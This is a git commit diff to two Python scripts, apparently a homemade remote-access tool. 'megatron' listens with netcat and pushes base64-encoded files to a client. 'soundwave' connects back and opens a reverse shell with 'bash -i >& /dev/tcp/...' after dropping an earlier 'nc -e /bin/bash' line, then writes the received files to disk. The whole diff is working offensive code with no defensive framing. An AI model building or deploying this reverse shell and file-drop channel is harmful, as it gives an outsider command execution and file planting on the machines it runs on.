bc16c2d9e320da85b78ec15d20caa2260b4fb50a
Samdaaman <samuel.m.hogan@gmail.com>
2019-10-27 02:57:46 +1300

    beta still

--- megatron.py
+++ megatron.py
@@ -1,29 +1,44 @@
 import subprocess
 import sys
+import os
+import base64
 
 PORT_MAIN = '7890'
 PORT_SHELL = '7891'
 
+CMD_EXIT = '-e'
+CMD_NEW_FILE = '-c'
+CMD_END_FILE = '-t'
+## TODO CMD_RM_FILE = '-r'
+## TODO CMD_NEW_SHELL = '-s'
+
+IGNORE_PREFIX = 'sndwv_'
+
+SOUNDWAVE_NAME = 'soundwave.py'
+MEGATRON_NAME = 'megatron.py'
+
+processed_files = [MEGATRON_NAME, SOUNDWAVE_NAME]
+
 
 def main():
     print('Initialising Communications on port:' + PORT_MAIN)
-    process_main = subprocess.Popen(["nc", "-lvp", PORT_MAIN], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+    process_main = subprocess.Popen(["nc", "-lvp", PORT_MAIN], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                                    stderr=subprocess.PIPE, universal_newlines=True)
     while 'received!' not in process_main.stderr.readline():
         if process_main.poll() is not None:
             raise Exception('Unexpected Error 101 - nc (main) closed unexpectedly')
 
     print('Initialising Shell on port:' + PORT_SHELL)
-    process_shell = subprocess.Popen(["gnome-terminal", "--", "nc", "-lvp", PORT_SHELL], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
-
+    process_shell = subprocess.Popen(["gnome-terminal", "--", "nc", "-lvp", PORT_SHELL], stdin=subprocess.PIPE,
+                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
 
     print('Connection from soundwave received')
     while True:
-        check_file_update()
+        files_update(process_main)
 
         if process_main.poll() is not None:
             print('Process terminated on soundwave end')
             break
-
 
     output = process_main.communicate()[0]
     print('ouput = ' + output)
@@ -31,8 +46,32 @@ def main():
     print('exitcode = ' + str(exitcode))
 
 
-def check_file_update():
-    return
+def files_update(process_main):
+    # TODO add in file updates
+    files_to_process = [f for f in os.listdir('.') if
+                        os.path.isfile(f) and f not in processed_files and not f.startswith(IGNORE_PREFIX)]
+    if not files_to_process:
+        return
+
+    for file_name in files_to_process:
+        processed_files.append(file_name)
+        transfer_file(file_name, process_main)
+
+
+def transfer_file(file_name, process_main):
+    print('Transferring file: ' + file_name)
+    with open(file_name, 'rb') as file_handle:
+        file_contents = file_handle.read()
+    encoded = base64.b64encode(file_contents).decode('utf-8')
+    stdin_writeline(CMD_NEW_FILE, process_main)
+    stdin_writeline(file_name, process_main)
+    stdin_writeline(encoded, process_main)
+    stdin_writeline(CMD_END_FILE, process_main)
+
+
+def stdin_writeline(line, process):
+    process.stdin.write(line + '\n')
+    process.stdin.flush()
 
 
 if __name__ == "__main__":
--- soundwave.py
+++ soundwave.py
@@ -1,30 +1,50 @@
 import subprocess
 import sys
+import base64
 
-
+# TODO use socat binary for terminal
 REMOTE_IP = '127.0.0.1'
 PORT_MAIN = '7890'
 PORT_SHELL = '7891'
+PREFIX = 'sndwv_'  # leave blank if original filename is desired
+
+CMD_EXIT = '-e'
+CMD_NEW_FILE = '-c'
+CMD_END_FILE = '-t'
 
 
 def main():
     print('Initialising main coms')
-    process_main = subprocess.Popen(["nc", REMOTE_IP, PORT_MAIN], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+    process_main = subprocess.Popen(['nc', REMOTE_IP, PORT_MAIN], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                                    stderr=subprocess.PIPE, universal_newlines=True)
     print('Initialising remote shell')
-    process_shell = subprocess.Popen(["nc", '-e', '/bin/bash', REMOTE_IP, PORT_MAIN], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
-
-    if process_main.poll() is not None and process_shell.poll() is not None:
-        print('Initialisation Successful')
-    else:
-        raise Exception('Error during initialisation - is megatron running?')
+    # process_shell = subprocess.Popen(['nc', '-e', '/bin/bash', REMOTE_IP, PORT_SHELL], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+    process_shell = subprocess.Popen('bash -i >& /dev/tcp/' + REMOTE_IP + '/' + PORT_SHELL + ' 0>&1', shell=True,
+                                     stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                     universal_newlines=True)
+    # if process_main.poll() is not None and process_shell.poll() is not None:
+    #    print('Initialisation Successful')
+    # else:
+    #    raise Exception('Error 102 during initialisation - is megatron running?')
 
     while True:
-        command = process_main.stdout.readline()
+        command = process_main.stdout.readline().rstrip()
         begin_file_update(command, process_main)
 
 
 def begin_file_update(command, process_main):
     print('command = ' + command)
+    if command == CMD_NEW_FILE:
+        file_name = process_main.stdout.readline().rstrip()
+        print('Receiving: ' + file_name + ' .....', end='')
+        encoded = process_main.stdout.readline().rstrip()
+        contents = base64.b64decode(encoded)
+        with open(PREFIX + file_name, 'wb+') as file_handle:
+            file_handle.write(contents)
+        if process_main.stdout.readline().rstrip() == CMD_END_FILE:
+            print(' Received!')
+        else:
+            raise Exception('Error 103 - End of file not found')
 
 
 if __name__ == "__main__":
